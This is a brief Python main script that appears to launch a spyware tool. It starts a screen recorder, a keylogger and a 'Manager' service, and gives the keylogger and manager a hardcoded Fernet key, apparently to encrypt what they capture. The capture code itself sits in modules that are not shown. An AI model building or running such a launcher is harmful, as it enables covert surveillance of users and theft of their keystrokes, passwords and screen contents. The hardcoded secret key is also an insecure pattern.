from program.screen_rec import ScreenRecording
from program.manager import Manager
from program.keylog import KeyLog

from threading import Thread
from cryptography.fernet import Fernet

import asyncio


SECRET_KEY = b"3lqUcKreSiI3DzVdHHD7VggudxDIcWCp-bONmioaebE="
fernet = Fernet(SECRET_KEY)

screen_rec = ScreenRecording()
keylog = KeyLog(fernet=fernet)
manager = Manager(fernet=fernet)

if __name__ == '__main__':
    asyncio.run(screen_rec.satart_service())
    keylog.satart_service()
    manager.satart_service()